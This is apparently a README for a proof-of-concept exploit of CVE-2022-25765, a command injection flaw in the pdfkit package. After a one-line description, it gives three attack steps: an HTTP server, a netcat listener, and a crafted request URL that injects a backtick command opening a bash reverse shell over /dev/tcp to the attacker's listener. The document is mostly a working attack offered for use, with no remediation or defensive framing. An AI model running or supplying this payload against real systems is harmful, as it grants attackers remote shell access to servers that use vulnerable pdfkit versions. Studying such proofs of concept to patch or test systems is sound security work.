# PDFkit-CMD-Injection 

CVE-2022-25765 Detail

Description
The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.



# PoC

### Start a HTTP server
<pre>
1- python3 -m http.server 80
</pre>
### Start a netcat listener
<pre>
2- nc -lnvp 'Target Port'
</pre>
### Make a request 
<pre>
3- http://"TARGET_ADDRESS:Target PORT"//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"Target_ADRESS/LISTENING_PORT"<&1'`'}
</pre>
